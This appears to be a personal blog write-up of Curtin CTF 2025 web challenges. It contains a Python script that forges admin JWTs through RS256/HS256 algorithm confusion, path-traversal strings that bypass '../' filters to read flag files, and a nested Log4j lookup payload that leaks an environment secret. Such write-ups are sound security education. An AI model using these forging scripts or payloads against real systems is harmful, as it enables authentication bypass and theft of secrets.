---
title: "Curtin CTF 2025"
date: 2025-12-07 00:00 +0800
categories: [CTF]
tags: []
image: https://github.com/user-attachments/assets/baf15847-33f5-4fb9-9913-338845122179
---

# Web 

## Agent Jonathan Walkins Trafalgar

The web app is styled like a spy‑themed mission interface. It greets you as an agent and provides a text area to paste a JWT, with two buttons: one to `Unlock Vault` and another to `Get Public Key`. The intel box reveals that the vault uses **RS256** for legitimate tokens and exposes a **/public-key** endpoint.

<img width="1616" height="958" alt="image" src="https://github.com/user-attachments/assets/ffbb77ec-7baf-4d72-bd90-4a2160875964" />

Here is an example when we `Get Public Key`: 

<img width="1079" height="661" alt="image" src="https://github.com/user-attachments/assets/b7c282bd-4e2e-4b0e-a7b1-5065aea7a439" />

This challenge was about JWT authentication.

The web app claimed to use `RS256`, which normally means only the **server’s private key** can create valid tokens, while the public key is just for checking them. Under normal circumstances, that would make it impossible for us to generate our own valid token.

However, the app was misconfigured: it also accepted tokens signed with `HS256`, and it mistakenly used the exposed public key as the secret. By switching the algorithm to `HS256` and signing with that public key string, we could forge tokens and trick the server into accepting them.

To speed things up, I used a script to automatically generate tokens with different payloads (like `{"admin": true}` or `{"role": "admin"}`).

Here's final script:

```
import json
import base64
import hmac
import hashlib

public_key = """-----BEGIN PUBLIC KEY-----
...
-----END PUBLIC KEY-----"""

# Add \n to match public key behavior
secret = public_key + "\n" 

# Try several likely admin payloads
payloads = {
    "admin_bool_only": {"admin": True},
    "sub_admin_and_bool": {"sub": "admin", "admin": True},
    "username_admin_and_bool": {"username": "admin", "admin": True},
    "role_admin_and_bool": {"role": "admin", "admin": True},
    "isAdmin_true": {"isAdmin": True},
    "combo": {"sub": "admin", "role": "admin", "admin": True},
}

header = {"alg": "HS256", "typ": "JWT"}

def b64url_encode(b: bytes) -> str:
    return base64.urlsafe_b64encode(b).decode().rstrip("=")

def make_token(payload: dict) -> str:
    header_b64 = b64url_encode(json.dumps(header, separators=(",", ":")).encode())
    payload_b64 = b64url_encode(json.dumps(payload, separators=(",", ":")).encode())
    msg = f"{header_b64}.{payload_b64}".encode()
    sig = hmac.new(secret.encode(), msg=msg, digestmod=hashlib.sha256).digest()
    sig_b64 = b64url_encode(sig)
    return f"{header_b64}.{payload_b64}.{sig_b64}"

for name, pl in payloads.items():
    print(f"\n=== {name} ===")
    print(pl)
    print(make_token(pl))
```

Try each payload:

<img width="954" height="501" alt="image" src="https://github.com/user-attachments/assets/321683bb-71c4-4d42-a873-e71fa96fd99e" />

In the end, the payload was just:
```
{
  "admin": true
}
```

I spent time overthinking different claim names, but the simplest one worked. Lesson learned: sometimes the easiest payload is all you need to unlock the vault.

<img width="1097" height="697" alt="image" src="https://github.com/user-attachments/assets/83433181-cf97-476f-974a-c92ce2b41219" />

### Flag:

```
CURTIN_CTF{alg_c0nfus10n_w1th_publ1c_k3y_1s_c00l}
```

## Adventures of Harald Part 1

In the home page, the web app brought us to another subdirectories which located at **/library/** that will let us read any books.

<img width="1919" height="964" alt="image" src="https://github.com/user-attachments/assets/857c68db-e890-4d77-bac5-a2be25ef53a7" />

From the url, straight away got me thinking about LFI.

Local File Inclusion (LFI) is a web security vulnerability that allows an attacker to include files on a server through the exploitation of vulnerable inclusion procedures in a web application. This can lead to the exposure of sensitive information

<img width="1915" height="965" alt="image" src="https://github.com/user-attachments/assets/617a1597-b606-4a5f-9371-cd85481aeabc" />

We simply redirect from reading the book to read the flag.txt that located in the web app root.

<img width="1477" height="422" alt="image" src="https://github.com/user-attachments/assets/0447650f-db3e-48e5-9b75-c82eb0479cb8" />

### Flag:
```
CURTIN_CTF{Anc13nt_S3cr3ts_&_F0rb1dd3n_L0r3!}
```

## Adventures of Harald Part 2

This had the same ui as **Adventures of Harald Part 1**, So it should be a little harder.

In the home page, the web app brought us to another subdirectories which located at **/library/** that will let us read any books.

<img width="1914" height="962" alt="image" src="https://github.com/user-attachments/assets/5924bf9d-f168-43d3-b16f-8c0771576c5c" />

<img width="1560" height="478" alt="image" src="https://github.com/user-attachments/assets/b0dbb519-307c-4fb7-97f2-c106b382f9d3" />

We simply redirect from read **book1.txt** to read the **flag.txt** that located in the **web app root** as we did before but its not working. 

<img width="1413" height="422" alt="image" src="https://github.com/user-attachments/assets/79c94535-71b3-4542-a892-dae23e3336fc" />

From the response, we can tell there’s some kind of filtering happening. When we tried `../flag.txt`, the output only showed `flag.txt` with the message:

`A glimpse into: flag.txt`

This means the ../ part was blocked by the filter.

To test how the filter works, I tried doubling the dots and slashes to see if it was removing just . and / separately, or specifically the ../ sequence. That trick bypassed the filter and that’s when we were able to read the flag.

<img width="1531" height="546" alt="image" src="https://github.com/user-attachments/assets/c2269e7a-7de9-47cf-9547-bf12e1640ce3" />

### Flag:
```
CURTIN_CTF{The_Owl_S33s_Y0ur_Cur10s1ty!}
```

## Adventures of Harald Part 3

This had the same ui as **Adventures of Harald Part 1** and **Adventures of Harald Part 2**, And this one is the last one. It should be the one that would be impossible. 

<img width="1485" height="531" alt="image" src="https://github.com/user-attachments/assets/18fd2478-20e4-48a9-9524-7e54ad0206f1" />

Again, we tried the one we use before **....//flag.txt**

<img width="1325" height="519" alt="image" src="https://github.com/user-attachments/assets/148e09f0-552c-4963-9c15-4ce0cb946e8c" />

As we can see, the response only return **//flag.txt**. However after a while i seem can't to figure how to bypass the filteration. 

That's when i tried to take a step back a bit, and try to enumerate the backend and maybe if we are lucky we could possibly try and read the source code? 

And... yes we were able to read the source code

<img width="1054" height="606" alt="image" src="https://github.com/user-attachments/assets/616f194a-3e4b-4d23-adfa-e77a0a898634" />

```
<?php
    if (isset($_GET["book"])) {
        $file_name  = $_GET["book"];

        $raw_input = $file_name;
        $sanitized_name = $file_name;
        do {
            $file_name = $sanitized_name;
            $sanitized_name = str_replace( '../', '', $file_name );
        } while ($sanitized_name !== $file_name);
        $file_name = $sanitized_name;

            if (preg_match('/^(?:\.\.\\\\\/){3}[^\/\\\\]+\.txt$/', $raw_input)) {
                $file_name = '../flag.txt';
            }
    }
?>
```
The filter is weak because it only removes ../ with forward slashes. It doesn’t block mixed separators like ..\/. So if we send:

`..\/..\/..\/flag.txt` Which means we can read the flag file.

<img width="1119" height="379" alt="image" src="https://github.com/user-attachments/assets/57d89490-5024-4a38-998c-f8d64d77a095" />

### Flag:
```
CURTIN_CTF{The_L4byr1nth_Unf0lds_B4_Y0u!}
```

<img width="1512" height="447" alt="image" src="https://github.com/user-attachments/assets/a3ffd0c9-d25a-42aa-83cc-380e28d8e052" />

## 0(nlog4)

This question brought me closer to GPT more than anyone knows. At some point it felt less like solving a CTF and more like venting to a friend who just nods along while you complain. And in the end, after all that back‑and‑forth, the solution wasn’t some genius breakthrough. It was me Googling an old writeup like a student copying homework the night before class.

<img width="829" height="689" alt="image" src="https://github.com/user-attachments/assets/2b0058af-6327-47ee-9923-de65a52d76a6" />

At the beginning, the website only showed us the `/help` page, which pointed to the /add endpoint. After intercepting the requests, we discovered there were more hidden routes like /suggest and /log. Finding those felt promising, but even with the extra endpoints nothing really revealed what the backend was doing or how the challenge was meant to be solved.

- /help (the typical manual book i would say)
- /list (list of notes printed in logs that only show the date and time)
- /add [anything] (add new notes or anything, once added it will give us the notes id in number that will add up everytime new notes is being written)
- /suggest (this one i was literally unclear how it suppose to be working, i thought it was some kind of replaying the notes however. When i feed it with the note it just, gave me something like **"Short note — try expanding with context, why it matters, and next steps."** - _EVEN AFTER I GAVE A WHOLE 10 PARAGRAPH OF LOREM IPSUM T_T._ Im begging someone please educate me more on this one!!) 

<img width="838" height="411" alt="image" src="https://github.com/user-attachments/assets/fd612a21-c33c-432d-bd3c-22121a596101" />

The challenge only had a single instance, and with so many teams hitting it at once, the server kept getting overloaded and unstable. After spending hours trying to figure out what was going on, I eventually stepped back and let others keep poking at it. At that point the instance was basically cooked, like trying to run a CTF on a microwave, so I just walked away to cool off and came back later when things weren’t burning.

After a few hours, I decided to try the challenge again. This time I searched on Google for old write‑ups or similar exploits, and that’s when I found a write‑up that matched what I was facing (exactly same ui :3). I turned to my team and said, “Don’t worry, I got this,” even though what I really had was someone else’s homework.

https://sigflag.at/blog/2022/writeup-googlectf2022-log4j/

<img width="906" height="880" alt="Screenshot 2025-12-08 145933" src="https://github.com/user-attachments/assets/6b05d68a-2562-42ba-b76d-e1a90861c323" />

The Google CTF 2022 Log4j challenge was about exploiting logging behavior in a backend using Log4j 2.17.2. Instead of the classic Log4Shell exploit (which was patched), the challenge focused on tricking Log4j into leaking the flag through its logging patterns.

So in short, the challenge was a twist: you could not use the famous Log4Shell exploit, but you had to abuse Log4j’s logging features to extract the flag.

From my understanding based on the writeups, the challenge required us to use a nested payload instead of directly reading the environment variable. The usual idea of using something like ${env:FLAG} was not enough because the patched version of Log4j blocked the straightforward routes.

Instead, the solution involved combining lookups so that one lookup would expand into another. For example, a payload such as ${java:runtime:${env:FLAG}} first resolves the inner part ${env:FLAG} to the flag value, then passes that into the outer lookup ${java:runtime:...} which gets logged. This nesting allowed the flag to be revealed through the logging process even though the direct environment lookup was restricted.

So the key point is that the challenge was not about the classic Log4Shell exploit but about abusing Log4j’s lookup features in a nested way to leak the flag.

<img width="1877" height="706" alt="Screenshot 2025-12-08 121308" src="https://github.com/user-attachments/assets/8c9fc644-dae1-4d6b-9b85-45d7f2a3c117" />


# Beyond the flags:

![CTF-2025-1260x630](https://github.com/user-attachments/assets/baf15847-33f5-4fb9-9913-338845122179)

<img width="1523" height="594" alt="image" src="https://github.com/user-attachments/assets/1e6e6575-454c-4964-98c0-951450df2599" />

<img width="1524" height="871" alt="image" src="https://github.com/user-attachments/assets/23c02b7b-27d4-4a64-9675-db690a98d0ae" />
